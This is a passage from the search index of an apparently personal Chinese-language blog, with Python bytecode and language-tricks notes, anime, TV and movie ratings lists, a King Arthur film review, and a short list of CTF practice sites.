\u662f\u5167\u5efa\u7684\u51fd\u5f0f","title":"python \u2192 PyCodeObject"},{"location":"programming/python/pyc/#marshal","text":"import marshal obj = marshal . loads ( open ( 'test.pyc' , 'rb' ) . read ()[ 16 :]) data = marshal . dumps ([ 1 , 2 , 3 ])","title":"marshal"},{"location":"programming/python/pyc/#bytecode-disassemble","text":"import dis dis . dis ( bytecode ) https://docs.python.org/3/library/dis.html \u21a9 http://unpyc.sourceforge.net/Opcodes.html \u21a9 https://kdr2.com/tech/main/1012-pyc-format.html \u21a9 https://late.am/post/2012/03/26/exploring-python-code-objects.html \u21a9","title":"bytecode disassemble"},{"location":"programming/python/tricks/","text":"python \u4e2d\u7684\u5947\u6deb\u6280\u5de7 \u5217\u4e86\u4e00\u4e9b\u6211\u65b0\u767c\u73fe\u7684\u5404\u7a2e\u82b1\u62db Function Attributes 2.1 PEP 232 python def a (): a . count += 1 a . count = 0 for i in range ( 10 ): a () print ( a . count ) output 10 \u8ddf C++ \u4e2d\uff0c\u5728 function \u88e1\u9762\u5ba3\u544a static \u8b8a\u6578\u5dee\u4e0d\u591a Keyword-Only Arguments 3.0 PEP 3102 def func(a, b, *, c = None): pass func(1, 2, 3) func(1, 2, c = 3) Additional Unpacking Generalizations 3.5 PEP 448 python a = [ 1 , 2 , 3 ] b = [ * a , 4 , 5 ] print ( b ) output [ 1 , 2 , 3 , 4 , 5 ] Merge Dicts python a = { 1 : 2 } b = { 3 : 4 } c = { ** a , ** b } print ( c ) output { 1 : 2 , 3 : 4 } Metaclasses Python Metaclasses metaclasses class A : pass B = type ( 'B' , ( A ,), { 'attr' : 10 , 'func' : lambda obj : obj . attr }) b = B () print ( b . attr ) print ( b . func ()) normal class A : pass class B ( A ): attr = 10 def func ( self ): return self . attr b = B () print ( b . attr ) print ( b . func ()) output 10 10 \u770b\u770b\u5c31\u597dxD shallow vs deep copy Shallow vs Deep Copying of Python Objects assign python a = [[ 1 , 2 , 3 ], [ 4 , 5 , 6 ]] b = a b . append ( 'hello' ) b [ 0 ] . append ( 'world' ) print ( a ) print ( b ) output [[ 1 , 2 , 3 , 'world' ], [ 4 , 5 , 6 ], 'hello' ] [[ 1 , 2 , 3 , 'world' ], [ 4 , 5 , 6 ], 'hello' ] copy python import copy a = [[ 1 , 2 , 3 ], [ 4 , 5 , 6 ]] b = copy . copy ( a ) b . append ( 'hello' ) b [ 0 ] . append ( 'world' ) print ( a ) print ( b ) output [[ 1 , 2 , 3 , 'world' ], [ 4 , 5 , 6 ]] [[ 1 , 2 , 3 , 'world' ], [ 4 , 5 , 6 ], 'new object' ] deepcopy python import copy a = [[ 1 , 2 , 3 ], [ 4 , 5 , 6 ]] b = copy . deepcopy ( a ) b . append ( 'hello' ) b [ 0 ] . append ( 'world' ) print ( a ) print ( b ) output [[ 1 , 2 , 3 ], [ 4 , 5 , 6 ]] [[ 1 , 2 , 3 , 'world' ], [ 4 , 5 , 6 ], 'new object' ] copy.copy (shallow) \u53ea\u8907\u88fd\u8a72\u7269\u4ef6\uff0c\u4e0d\u6703\u8907\u88fd\u5b50\u7269\u4ef6 copy.deepcopy (deep) \u6703\u905e\u8ff4\u8907\u88fd\u6240\u6709\u5b50\u7269\u4ef6 shallow copy on list option 1 a = [ 1 , 2 , 3 ] b = list ( a ) option 2 a = [ 1 , 2 , 3 ] b = a [:] option 3 a = [ 1 , 2 , 3 ] b = a . copy () option 4 import copy a = [ 1 , 2 , 3 ] b = copy . copy ( a ) annotations PEP 3107 PEP 526 function annotations python def func ( a : int , b : list ) -> int : pass print ( func . __annotations__ ) output { 'a' : < class ' int '>, ' b ': <class ' list '>, ' return ': <class ' int '>} class annotations python class A (): var : int print ( A . __annotations__ ) output { 'var' : < class ' int '>} variable annotations python a : int b : int = 2 print ( __annotations__ ) output { 'a' : < class ' int '>, ' b ': <class ' int '>} intern string s = 'hello' s = sys . intern ( s ) \u628a\u5b57\u4e32\u5b58\u9032\u5feb\u53d6\u6c60\uff0c\u76f8\u540c\u7684\u5b57\u4e32\u53ea\u6703\u5b58\u4e00\u6b21 \u505a\u5b57\u4e32\u6bd4\u5c0d\u6703\u6bd4\u8f03\u5feb\u4e14\u7bc0\u7701\u7a7a\u9593 http://guilload.com/python-string-interning/ \u21a9 http://www.laurentluce.com/posts/python-string-objects-implementation/ \u21a9","title":"python \u4e2d\u7684\u5947\u6deb\u6280\u5de7"},{"location":"programming/python/tricks/#python","text":"\u5217\u4e86\u4e00\u4e9b\u6211\u65b0\u767c\u73fe\u7684\u5404\u7a2e\u82b1\u62db","title":"python \u4e2d\u7684\u5947\u6deb\u6280\u5de7"},{"location":"programming/python/tricks/#function-attributes-21","text":"PEP 232 python def a (): a . count += 1 a . count = 0 for i in range ( 10 ): a () print ( a . count ) output 10 \u8ddf C++ \u4e2d\uff0c\u5728 function \u88e1\u9762\u5ba3\u544a static \u8b8a\u6578\u5dee\u4e0d\u591a","title":"Function Attributes 2.1"},{"location":"programming/python/tricks/#keyword-only-arguments-30","text":"PEP 3102 def func(a, b, *, c = None): pass func(1, 2, 3) func(1, 2, c = 3)","title":"Keyword-Only Arguments 3.0"},{"location":"programming/python/tricks/#additional-unpacking-generalizations-35","text":"PEP 448 python a = [ 1 , 2 , 3 ] b = [ * a , 4 , 5 ] print ( b ) output [ 1 , 2 , 3 , 4 , 5 ]","title":"Additional Unpacking Generalizations 3.5"},{"location":"programming/python/tricks/#merge-dicts","text":"python a = { 1 : 2 } b = { 3 : 4 } c = { ** a , ** b } print ( c ) output { 1 : 2 , 3 : 4 }","title":"Merge Dicts"},{"location":"programming/python/tricks/#metaclasses","text":"Python Metaclasses metaclasses class A : pass B = type ( 'B' , ( A ,), { 'attr' : 10 , 'func' : lambda obj : obj . attr }) b = B () print ( b . attr ) print ( b . func ()) normal class A : pass class B ( A ): attr = 10 def func ( self ): return self . attr b = B () print ( b . attr ) print ( b . func ()) output 10 10 \u770b\u770b\u5c31\u597dxD","title":"Metaclasses"},{"location":"programming/python/tricks/#shallow-vs-deep-copy","text":"Shallow vs Deep Copying of Python Objects assign python a = [[ 1 , 2 , 3 ], [ 4 , 5 , 6 ]] b = a b . append ( 'hello' ) b [ 0 ] . append ( 'world' ) print ( a ) print ( b ) output [[ 1 , 2 , 3 , 'world' ], [ 4 , 5 , 6 ], 'hello' ] [[ 1 , 2 , 3 , 'world' ], [ 4 , 5 , 6 ], 'hello' ] copy python import copy a = [[ 1 , 2 , 3 ], [ 4 , 5 , 6 ]] b = copy . copy ( a ) b . append ( 'hello' ) b [ 0 ] . append ( 'world' ) print ( a ) print ( b ) output [[ 1 , 2 , 3 , 'world' ], [ 4 , 5 , 6 ]] [[ 1 , 2 , 3 , 'world' ], [ 4 , 5 , 6 ], 'new object' ] deepcopy python import copy a = [[ 1 , 2 , 3 ], [ 4 , 5 , 6 ]] b = copy . deepcopy ( a ) b . append ( 'hello' ) b [ 0 ] . append ( 'world' ) print ( a ) print ( b ) output [[ 1 , 2 , 3 ], [ 4 , 5 , 6 ]] [[ 1 , 2 , 3 , 'world' ], [ 4 , 5 , 6 ], 'new object' ] copy.copy (shallow) \u53ea\u8907\u88fd\u8a72\u7269\u4ef6\uff0c\u4e0d\u6703\u8907\u88fd\u5b50\u7269\u4ef6 copy.deepcopy (deep) \u6703\u905e\u8ff4\u8907\u88fd\u6240\u6709\u5b50\u7269\u4ef6","title":"shallow vs deep copy"},{"location":"programming/python/tricks/#shallow-copy-on-list","text":"option 1 a = [ 1 , 2 , 3 ] b = list ( a ) option 2 a = [ 1 , 2 , 3 ] b = a [:] option 3 a = [ 1 , 2 , 3 ] b = a . copy () option 4 import copy a = [ 1 , 2 , 3 ] b = copy . copy ( a )","title":"shallow copy on list"},{"location":"programming/python/tricks/#annotations","text":"PEP 3107 PEP 526","title":"annotations"},{"location":"programming/python/tricks/#function-annotations","text":"python def func ( a : int , b : list ) -> int : pass print ( func . __annotations__ ) output { 'a' : < class ' int '>, ' b ': <class ' list '>, ' return ': <class ' int '>}","title":"function annotations"},{"location":"programming/python/tricks/#class-annotations","text":"python class A (): var : int print ( A . __annotations__ ) output { 'var' : < class ' int '>}","title":"class annotations"},{"location":"programming/python/tricks/#variable-annotations","text":"python a : int b : int = 2 print ( __annotations__ ) output { 'a' : < class ' int '>, ' b ': <class ' int '>}","title":"variable annotations"},{"location":"programming/python/tricks/#intern-string","text":"s = 'hello' s = sys . intern ( s ) \u628a\u5b57\u4e32\u5b58\u9032\u5feb\u53d6\u6c60\uff0c\u76f8\u540c\u7684\u5b57\u4e32\u53ea\u6703\u5b58\u4e00\u6b21 \u505a\u5b57\u4e32\u6bd4\u5c0d\u6703\u6bd4\u8f03\u5feb\u4e14\u7bc0\u7701\u7a7a\u9593 http://guilload.com/python-string-interning/ \u21a9 http://www.laurentluce.com/posts/python-string-objects-implementation/ \u21a9","title":"intern string"},{"location":"reviews/","text":"\u5f71\u8a55 \u8a18\u9304\u6211\u770b\u904e\u7684\u96fb\u5f71\u5f71\u96c6\u548c\u52d5\u6f2b\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5fc3\u5f97xD \u6700\u65b0\u5f71\u8a55 \u985e\u578b \u540d\u7a31 \u8a55\u5206 \u96fb\u5f71 \u4e9e\u745f:\u738b\u8005\u4e4b\u528d 81","title":"\u6700\u65b0\u5f71\u8a55"},{"location":"reviews/#_1","text":"\u8a18\u9304\u6211\u770b\u904e\u7684\u96fb\u5f71\u5f71\u96c6\u548c\u52d5\u6f2b\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5fc3\u5f97xD","title":"\u5f71\u8a55"},{"location":"reviews/#_2","text":"\u985e\u578b \u540d\u7a31 \u8a55\u5206 \u96fb\u5f71 \u4e9e\u745f:\u738b\u8005\u4e4b\u528d 81","title":"\u6700\u65b0\u5f71\u8a55"},{"location":"reviews/anime/list/","text":"\u52d5\u6f2b\u5217\u8868 \u5217\u8868 \u540d\u5b57 \u5b63 \u8a55\u5206 \u9032\u5ea6 \u4e9e\u4eba 2 9.0 \u770b\u5b8c\u60f9 \u65ac\uff01\u8d64\u7d05\u4e4b\u77b3 1 9.5 \u770b\u5b8c\u60f9 \u4e00\u62f3\u8d85\u4eba 1 9.2 \u770b\u5b8c\u60f9 \u5200\u528d\u795e\u57df 3 9.2 \u8ffd\u756a\u4e2d \u9f8d\u738b\u7684\u5de5\u4f5c 1 8.5 \u770b\u5b8c\u60f9 \u68cb\u9748\u738b 1 8.7 \u770b\u5b8c\u60f9 Re:\u5f9e\u96f6\u958b\u59cb\u7684\u7570\u4e16\u754c\u751f\u6d3b 1 8.9 \u770b\u5b8c\u60f9 \u5728\u4e0b\u5742\u672c\uff0c\u6709\u4f55\u8cb4\u5e79\uff1f 1 9.3 \u770b\u5b8c\u60f9 \u6211\u5011\u4ecd\u672a\u77e5\u9053\u90a3\u5929\u6240\u770b\u898b\u7684\u82b1\u540d 1 9.4 \u770b\u5b8c\u60f9 Angel Beats! 1 9.3 \u770b\u5b8c\u60f9 \u9032\u64ca\u7684\u5de8\u4eba 2 8.9 \u770b\u5b8c\u60f9 \u9b54\u6cd5\u79d1\u9ad8\u4e2d\u7684\u52a3\u7b49\u751f 1 8.8 \u770b\u5b8c\u60f9 \u8a18\u9304\u7684\u5730\u5e73\u7dda 2 8.9 \u770b\u5b8c\u60f9 \u96d9\u661f\u9670\u967d\u5e2b 1 8.2 \u770b\u5b8c\u60f9 \u566c\u795e\u8005 1 9.3 \u770b\u5b8c\u60f9 \u6697\u6bba\u6559\u5ba4 2 9.6 \u770b\u5b8c\u60f9 \u7532\u9435\u57ce\u7684\u5361\u5df4\u5167\u5229 1 9.4 \u770b\u5b8c\u60f9 \u5728\u5730\u4e0b\u57ce\u5c0b\u6c42\u9082\u9005\u662f\u5426\u641e\u932f\u4e86\u4ec0\u9ebc 1 8.9 \u770b\u5b8c\u60f9 \u904a\u6232\u4eba\u751f 1 9.1 \u770b\u5b8c\u60f9 \u7d42\u7d50\u7684\u71be\u5929\u4f7f 2 8.6 \u770b\u5b8c\u60f9 \u70ba\u7f8e\u597d\u7684\u4e16\u754c\u737b\u4e0a\u795d\u798f\uff01 2 9.3 \u770b\u5b8c\u60f9 \u5e7c\u5973\u6230\u8a18 1 9.0 \u770b\u5b8c\u60f9 \u653f\u5b97\u541b\u7684\u5fa9\u4ec7 1 9.1 \u770b\u5b8c\u60f9 \u92fc\u4e4b\u934a\u91d1\u8853\u5e2b 1 9.2 \u770b\u5b8c\u60f9 \u672b\u65e5\u6642\u5728\u505a\u4ec0\u9ebc\uff1f\u6709\u6c92\u6709\u7a7a\uff1f\u53ef\u4ee5\u4f86\u62ef\u6551\u55ce\uff1f 1 9.1 \u770b\u5b8c\u60f9 \u6708\u8272\u771f\u7f8e 1 9.3 \u770b\u5b8c\u60f9 \u554f\u984c\u5152\u7ae5\u90fd\u4f86\u81ea\u7570\u4e16\u754c\uff1f 1 9.1 \u770b\u5b8c\u60f9 DARLING in the FRANXX 1 9.0 \u770b\u5b8c\u60f9 \u6975\u9053\u8d85\u5973 1 9.4 \u770b\u5b8c\u60f9 \u6211\u7684\u82f1\u96c4\u5b78\u9662 4 8.8 \u770b\u5b8c\u60f9 Fate/Stay Night 2 9.0 \u770b\u5b8c\u60f9 \u6ce5\u9be8\u4e4b\u5b50\u5011\u5728\u6c99\u5730\u4e0a\u6b4c\u5531 1 9.5 \u770b\u5b8c\u60f9 Fate/Apocrypha 2 9.3 \u770b\u5b8c\u60f9 GATE \u5947\u5e7b\u81ea\u885b\u968a 1 9.0 \u770b\u5b8c\u60f9 Overlord 3 9.3 \u770b\u5b8c\u60f9 \u547d\u904b\u77f3\u4e4b\u9580 2 9.4 \u770b\u5b8c\u60f9 \u95dc\u65bc\u6211\u8f49\u751f\u8b8a\u6210\u53f2\u840a\u59c6\u9019\u6a94\u4e8b 1 ? \u8ffd\u756a\u4e2d \u4f86\u81ea\u98a8\u5e73\u6d6a\u975c\u7684\u660e\u65e5 1 ? \u6392\u968a\u4e2d K-ON\uff01\u8f15\u97f3\u90e8 2 ? \u6392\u968a\u4e2d \u6d41\u6d6a\u795e\u5dee 1 8.8 \u5df2\u653e\u68c4","title":"\u5217\u8868"},{"location":"reviews/anime/list/#_1","text":"","title":"\u52d5\u6f2b\u5217\u8868"},{"location":"reviews/anime/list/#_2","text":"\u540d\u5b57 \u5b63 \u8a55\u5206 \u9032\u5ea6 \u4e9e\u4eba 2 9.0 \u770b\u5b8c\u60f9 \u65ac\uff01\u8d64\u7d05\u4e4b\u77b3 1 9.5 \u770b\u5b8c\u60f9 \u4e00\u62f3\u8d85\u4eba 1 9.2 \u770b\u5b8c\u60f9 \u5200\u528d\u795e\u57df 3 9.2 \u8ffd\u756a\u4e2d \u9f8d\u738b\u7684\u5de5\u4f5c 1 8.5 \u770b\u5b8c\u60f9 \u68cb\u9748\u738b 1 8.7 \u770b\u5b8c\u60f9 Re:\u5f9e\u96f6\u958b\u59cb\u7684\u7570\u4e16\u754c\u751f\u6d3b 1 8.9 \u770b\u5b8c\u60f9 \u5728\u4e0b\u5742\u672c\uff0c\u6709\u4f55\u8cb4\u5e79\uff1f 1 9.3 \u770b\u5b8c\u60f9 \u6211\u5011\u4ecd\u672a\u77e5\u9053\u90a3\u5929\u6240\u770b\u898b\u7684\u82b1\u540d 1 9.4 \u770b\u5b8c\u60f9 Angel Beats! 1 9.3 \u770b\u5b8c\u60f9 \u9032\u64ca\u7684\u5de8\u4eba 2 8.9 \u770b\u5b8c\u60f9 \u9b54\u6cd5\u79d1\u9ad8\u4e2d\u7684\u52a3\u7b49\u751f 1 8.8 \u770b\u5b8c\u60f9 \u8a18\u9304\u7684\u5730\u5e73\u7dda 2 8.9 \u770b\u5b8c\u60f9 \u96d9\u661f\u9670\u967d\u5e2b 1 8.2 \u770b\u5b8c\u60f9 \u566c\u795e\u8005 1 9.3 \u770b\u5b8c\u60f9 \u6697\u6bba\u6559\u5ba4 2 9.6 \u770b\u5b8c\u60f9 \u7532\u9435\u57ce\u7684\u5361\u5df4\u5167\u5229 1 9.4 \u770b\u5b8c\u60f9 \u5728\u5730\u4e0b\u57ce\u5c0b\u6c42\u9082\u9005\u662f\u5426\u641e\u932f\u4e86\u4ec0\u9ebc 1 8.9 \u770b\u5b8c\u60f9 \u904a\u6232\u4eba\u751f 1 9.1 \u770b\u5b8c\u60f9 \u7d42\u7d50\u7684\u71be\u5929\u4f7f 2 8.6 \u770b\u5b8c\u60f9 \u70ba\u7f8e\u597d\u7684\u4e16\u754c\u737b\u4e0a\u795d\u798f\uff01 2 9.3 \u770b\u5b8c\u60f9 \u5e7c\u5973\u6230\u8a18 1 9.0 \u770b\u5b8c\u60f9 \u653f\u5b97\u541b\u7684\u5fa9\u4ec7 1 9.1 \u770b\u5b8c\u60f9 \u92fc\u4e4b\u934a\u91d1\u8853\u5e2b 1 9.2 \u770b\u5b8c\u60f9 \u672b\u65e5\u6642\u5728\u505a\u4ec0\u9ebc\uff1f\u6709\u6c92\u6709\u7a7a\uff1f\u53ef\u4ee5\u4f86\u62ef\u6551\u55ce\uff1f 1 9.1 \u770b\u5b8c\u60f9 \u6708\u8272\u771f\u7f8e 1 9.3 \u770b\u5b8c\u60f9 \u554f\u984c\u5152\u7ae5\u90fd\u4f86\u81ea\u7570\u4e16\u754c\uff1f 1 9.1 \u770b\u5b8c\u60f9 DARLING in the FRANXX 1 9.0 \u770b\u5b8c\u60f9 \u6975\u9053\u8d85\u5973 1 9.4 \u770b\u5b8c\u60f9 \u6211\u7684\u82f1\u96c4\u5b78\u9662 4 8.8 \u770b\u5b8c\u60f9 Fate/Stay Night 2 9.0 \u770b\u5b8c\u60f9 \u6ce5\u9be8\u4e4b\u5b50\u5011\u5728\u6c99\u5730\u4e0a\u6b4c\u5531 1 9.5 \u770b\u5b8c\u60f9 Fate/Apocrypha 2 9.3 \u770b\u5b8c\u60f9 GATE \u5947\u5e7b\u81ea\u885b\u968a 1 9.0 \u770b\u5b8c\u60f9 Overlord 3 9.3 \u770b\u5b8c\u60f9 \u547d\u904b\u77f3\u4e4b\u9580 2 9.4 \u770b\u5b8c\u60f9 \u95dc\u65bc\u6211\u8f49\u751f\u8b8a\u6210\u53f2\u840a\u59c6\u9019\u6a94\u4e8b 1 ? \u8ffd\u756a\u4e2d \u4f86\u81ea\u98a8\u5e73\u6d6a\u975c\u7684\u660e\u65e5 1 ? \u6392\u968a\u4e2d K-ON\uff01\u8f15\u97f3\u90e8 2 ? \u6392\u968a\u4e2d \u6d41\u6d6a\u795e\u5dee 1 8.8 \u5df2\u653e\u68c4","title":"\u5217\u8868"},{"location":"reviews/movies/king-arthur/","text":"\u4e9e\u745f:\u738b\u8005\u4e4b\u528d \u666e\u904d\u8a55\u50f9 IMDB : 6.8 / 10 rottentomatoes : 4.7 / 10 \u6211\u7684\u8a55\u50f9 \u984c\u6750\u65b0\u9bae\u5ea6 : 3 / 10 \u5361\u53f8\u77e5\u540d\u5ea6 : 8 / 10 \u5287\u60c5\u6d41\u66a2\u5ea6 : 9 / 10 \u7279\u6548\u83ef\u9e97\u5ea6 : 8 / 10 \u6574\u9ad4\u89c0\u5f71\u611f\u53d7 : 9 / 10 \u611f\u60f3 \u6230\u9b25\u5834\u9762\u5341\u5206\u6709\u7bc0\u594f\u611f\uff0c\u6709\u8a31\u591a\u6162\u52d5\u4f5c\u93e1\u982d \u6558\u8ff0\u6545\u4e8b\u7684\u65b9\u5f0f\u6703\u7528\u6709\u7bc0\u594f\u7684\u97f3\u6a02\u548c\u8a9e\u8abf\uff0c\u908a\u6558\u8ff0\u908a\u5448\u73fe\u756b\u9762\uff0c\u6709\u9ede\u50cf \u6b7b\u4f8d2 \u88e1\u9762\u7684\u6a4b\u6bb5\uff0c\u4f46\u6709\u6642\u5019\u756b\u9762\u8df3\u4f86\u8df3\u53bb\u6709\u9ede\u4e0d\u6e05\u695a \u5728\u96fb\u5f71\u88e1\u9762\u6c92\u63d0\u5230\u70ba\u4ec0\u9ebc\u570b\u738b\u7684\u5f1f\u5f1f\u6703\u9019\u9ebc\u5ac9\u5992\u570b\u738b\uff0c\u751a\u81f3\u4e0d\u60dc\u8981\u6bba\u6b7b\u4ed6\u7684\u59bb\u5b50\u5973\u5152\u4f86\u5f97\u5230\u529b\u91cf\uff0c\u524d\u9762\u7684\u4e00\u4e9b\u80cc\u666f\u6558\u8ff0\u7684\u4e0d\u5920\u6e05\u695a\uff0c\u4e5f\u53ef\u80fd\u662f\u76f8\u4fe1\u5927\u5bb6\u90fd\u770b\u904e\u4e9e\u745f\u738b\u7684\u6b77\u53f2\u6545\u4e8b? \u6574\u9ad4\u4f86\u8aaa\u6558\u8ff0\u7684\u65b9\u5f0f\u633a\u6709\u8da3\u7684\uff0c\u6230\u9b25\u6d41\u66a2\u5834\u9762\u83ef\u9e97\uff0c\u4e3b\u89d2\u4e5f\u5f88\u6709\u500b\u4eba\u7279\u8272","title":"\u4e9e\u745f:\u738b\u8005\u4e4b\u528d"},{"location":"reviews/movies/king-arthur/#_1","text":"","title":"\u4e9e\u745f:\u738b\u8005\u4e4b\u528d"},{"location":"reviews/movies/king-arthur/#_2","text":"IMDB : 6.8 / 10 rottentomatoes : 4.7 / 10","title":"\u666e\u904d\u8a55\u50f9"},{"location":"reviews/movies/king-arthur/#_3","text":"\u984c\u6750\u65b0\u9bae\u5ea6 : 3 / 10 \u5361\u53f8\u77e5\u540d\u5ea6 : 8 / 10 \u5287\u60c5\u6d41\u66a2\u5ea6 : 9 / 10 \u7279\u6548\u83ef\u9e97\u5ea6 : 8 / 10 \u6574\u9ad4\u89c0\u5f71\u611f\u53d7 : 9 / 10","title":"\u6211\u7684\u8a55\u50f9"},{"location":"reviews/movies/king-arthur/#_4","text":"\u6230\u9b25\u5834\u9762\u5341\u5206\u6709\u7bc0\u594f\u611f\uff0c\u6709\u8a31\u591a\u6162\u52d5\u4f5c\u93e1\u982d \u6558\u8ff0\u6545\u4e8b\u7684\u65b9\u5f0f\u6703\u7528\u6709\u7bc0\u594f\u7684\u97f3\u6a02\u548c\u8a9e\u8abf\uff0c\u908a\u6558\u8ff0\u908a\u5448\u73fe\u756b\u9762\uff0c\u6709\u9ede\u50cf \u6b7b\u4f8d2 \u88e1\u9762\u7684\u6a4b\u6bb5\uff0c\u4f46\u6709\u6642\u5019\u756b\u9762\u8df3\u4f86\u8df3\u53bb\u6709\u9ede\u4e0d\u6e05\u695a \u5728\u96fb\u5f71\u88e1\u9762\u6c92\u63d0\u5230\u70ba\u4ec0\u9ebc\u570b\u738b\u7684\u5f1f\u5f1f\u6703\u9019\u9ebc\u5ac9\u5992\u570b\u738b\uff0c\u751a\u81f3\u4e0d\u60dc\u8981\u6bba\u6b7b\u4ed6\u7684\u59bb\u5b50\u5973\u5152\u4f86\u5f97\u5230\u529b\u91cf\uff0c\u524d\u9762\u7684\u4e00\u4e9b\u80cc\u666f\u6558\u8ff0\u7684\u4e0d\u5920\u6e05\u695a\uff0c\u4e5f\u53ef\u80fd\u662f\u76f8\u4fe1\u5927\u5bb6\u90fd\u770b\u904e\u4e9e\u745f\u738b\u7684\u6b77\u53f2\u6545\u4e8b? \u6574\u9ad4\u4f86\u8aaa\u6558\u8ff0\u7684\u65b9\u5f0f\u633a\u6709\u8da3\u7684\uff0c\u6230\u9b25\u6d41\u66a2\u5834\u9762\u83ef\u9e97\uff0c\u4e3b\u89d2\u4e5f\u5f88\u6709\u500b\u4eba\u7279\u8272","title":"\u611f\u60f3"},{"location":"reviews/movies/list/","text":"\u96fb\u5f71\u5217\u8868 \u8a55\u5206\u8a08\u7b97\u516c\u5f0f a = \u984c\u6750\u65b0\u9bae\u5ea6 b = \u5361\u53f8\u77e5\u540d\u5ea6 c = \u5287\u60c5\u6d41\u66a2\u5ea6 d = \u7279\u6548\u83ef\u9e97\u5ea6 e = \u6574\u9ad4\u89c0\u5f71\u611f\u53d7 score = ( a + b ) * 1.0 + ( c + d ) * 2.0 + e * 4.0 \u5217\u8868 \u96fb\u5f71 \u8a55\u5206 \u4e9e\u745f:\u738b\u8005\u4e4b\u528d 81","title":"\u5217\u8868"},{"location":"reviews/movies/list/#_1","text":"","title":"\u96fb\u5f71\u5217\u8868"},{"location":"reviews/movies/list/#_2","text":"a = \u984c\u6750\u65b0\u9bae\u5ea6 b = \u5361\u53f8\u77e5\u540d\u5ea6 c = \u5287\u60c5\u6d41\u66a2\u5ea6 d = \u7279\u6548\u83ef\u9e97\u5ea6 e = \u6574\u9ad4\u89c0\u5f71\u611f\u53d7 score = ( a + b ) * 1.0 + ( c + d ) * 2.0 + e * 4.0","title":"\u8a55\u5206\u8a08\u7b97\u516c\u5f0f"},{"location":"reviews/movies/list/#_3","text":"\u96fb\u5f71 \u8a55\u5206 \u4e9e\u745f:\u738b\u8005\u4e4b\u528d 81","title":"\u5217\u8868"},{"location":"reviews/series/list/","text":"\u5f71\u96c6\u5217\u8868 \u5f71\u96c6 \u540d\u5b57 \u5b63 \u8a55\u5206 \u9032\u5ea6 \u6b0a\u529b\u904a\u6232 ( Game of Thrones ) 7 9.7 \u770b\u5b8c\u60f9 \u795e\u76fe\u5c40\u7279\u5de5 ( Marvel's Agents of S.H.I.E.L.D. ) 5 9.7 \u770b\u5b8c\u60f9 \u78b3\u8b8a ( Altered Carbon ) 1 9.4 \u770b\u5b8c\u60f9 \u6551\u4e16 ( Salvation ) 1 8.6 \u770b\u5b8c\u60f9 \u8b8a\u7a2e\u5929\u8ce6 ( The Gifted ) 1 8.3 \u770b\u5b8c\u60f9 \u6f2b\u5a01\u9435\u62f3\u4fe0 ( Marvel's Iron Fist ) 1 8.1 \u770b\u5b8c\u60f9 \u8352\u539f ( Into the Badlands ) 1 8.8 \u770b\u5b8c\u60f9 \u6f22\u5a1c\u7684\u907a\u8a00 ( 13 Reasons Why ) 2 9.4 \u770b\u5b8c\u60f9 \u5047\u9762\u771f\u60c5 ( Imposters ) 2 9.3 \u770b\u5b8c\u60f9 \u8d85\u611f 8 \u4eba\u7d44 ( Sense8 ) 2 9.1 \u51b7\u51cd\u4e2d \u591c\u73ed\u6025\u8a3a\u5ba4 ( The Night Shift ) 4 9.0 \u51b7\u51cd\u4e2d \u52c1\u7206\u5973\u5b50\u76e3\u7344 ( Orange is the New Black 5 8.6 \u5df2\u653e\u68c4 \u7d55\u547d\u6bd2\u5e2b ( Breaking Bad ) 5 8.8 \u5df2\u653e\u68c4 \u8352\u5510\u5206\u5c40 ( Brooklyn Nine-Nine ) 5 8.7 \u5df2\u653e\u68c4 \u6307\u5b9a\u5016\u5b58\u8005 ( \u6307\u5b9a\u5016\u5b58\u8005 ) 2 8.5 \u5df2\u653e\u68c4 \u897f\u65b9\u6975\u6a02\u5712 ( Westworld ) 2 8.8 \u5df2\u653e\u68c4 \u65af\u5df4\u9054\u514b\u65af ( Spartacus ) 3 8.5 \u5df2\u653e\u68c4 \u5b85\u7537\u884c\u4e0d\u884c ( The Big Bang Theory ) 11 9.0 \u5df2\u653e\u68c4","title":"\u5217\u8868"},{"location":"reviews/series/list/#_1","text":"","title":"\u5f71\u96c6\u5217\u8868"},{"location":"reviews/series/list/#_2","text":"\u540d\u5b57 \u5b63 \u8a55\u5206 \u9032\u5ea6 \u6b0a\u529b\u904a\u6232 ( Game of Thrones ) 7 9.7 \u770b\u5b8c\u60f9 \u795e\u76fe\u5c40\u7279\u5de5 ( Marvel's Agents of S.H.I.E.L.D. ) 5 9.7 \u770b\u5b8c\u60f9 \u78b3\u8b8a ( Altered Carbon ) 1 9.4 \u770b\u5b8c\u60f9 \u6551\u4e16 ( Salvation ) 1 8.6 \u770b\u5b8c\u60f9 \u8b8a\u7a2e\u5929\u8ce6 ( The Gifted ) 1 8.3 \u770b\u5b8c\u60f9 \u6f2b\u5a01\u9435\u62f3\u4fe0 ( Marvel's Iron Fist ) 1 8.1 \u770b\u5b8c\u60f9 \u8352\u539f ( Into the Badlands ) 1 8.8 \u770b\u5b8c\u60f9 \u6f22\u5a1c\u7684\u907a\u8a00 ( 13 Reasons Why ) 2 9.4 \u770b\u5b8c\u60f9 \u5047\u9762\u771f\u60c5 ( Imposters ) 2 9.3 \u770b\u5b8c\u60f9 \u8d85\u611f 8 \u4eba\u7d44 ( Sense8 ) 2 9.1 \u51b7\u51cd\u4e2d \u591c\u73ed\u6025\u8a3a\u5ba4 ( The Night Shift ) 4 9.0 \u51b7\u51cd\u4e2d \u52c1\u7206\u5973\u5b50\u76e3\u7344 ( Orange is the New Black 5 8.6 \u5df2\u653e\u68c4 \u7d55\u547d\u6bd2\u5e2b ( Breaking Bad ) 5 8.8 \u5df2\u653e\u68c4 \u8352\u5510\u5206\u5c40 ( Brooklyn Nine-Nine ) 5 8.7 \u5df2\u653e\u68c4 \u6307\u5b9a\u5016\u5b58\u8005 ( \u6307\u5b9a\u5016\u5b58\u8005 ) 2 8.5 \u5df2\u653e\u68c4 \u897f\u65b9\u6975\u6a02\u5712 ( Westworld ) 2 8.8 \u5df2\u653e\u68c4 \u65af\u5df4\u9054\u514b\u65af ( Spartacus ) 3 8.5 \u5df2\u653e\u68c4 \u5b85\u7537\u884c\u4e0d\u884c ( The Big Bang Theory ) 11 9.0 \u5df2\u653e\u68c4","title":"\u5f71\u96c6"},{"location":"security/resources/","text":"CTF \u76f8\u95dc\u8cc7\u6e90 ctftime CTF Online Judge Bamboofox pwnable.tw pwnable.kr hackme","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/resources/#ctf","text":"ctftime","title":"CTF \u76f8\u95dc\u8cc7\u6e90"},{"location":"security/resources/#ctf-online-judge","text":"Bamboofox pwnable.tw pwnable.kr hackme","title":"CTF Online 